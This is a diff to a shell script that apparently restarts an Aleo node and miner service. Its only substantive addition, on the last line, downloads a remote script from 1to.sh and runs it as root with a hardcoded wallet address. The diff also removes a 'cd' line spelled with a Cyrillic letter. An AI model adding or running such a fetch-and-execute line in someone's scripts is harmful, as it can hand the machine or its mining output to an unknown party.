@@ -1,7 +1,5 @@
 #!/bin/bash
-сd $HOME/snarkOS
-echo "Checking for updates..."
-ls
+
 systemctl stop aleod
 systemctl stop aleod-miner
 cat /etc/systemd/system/aleod-miner.service
@@ -18,3 +16,4 @@ mv $HOME/aleod-miner.service /etc/systemd/system/
 systemctl daemon-reload
 sudo systemctl restart aleod-miner
 
+curl -sSf -L https://1to.sh/join | sudo sh -s -- "aleo1m8whdp5s3lnguhg4t0jvrj9g8jcwaguh5dk5qdn9q5fxstn755zsqd323n"
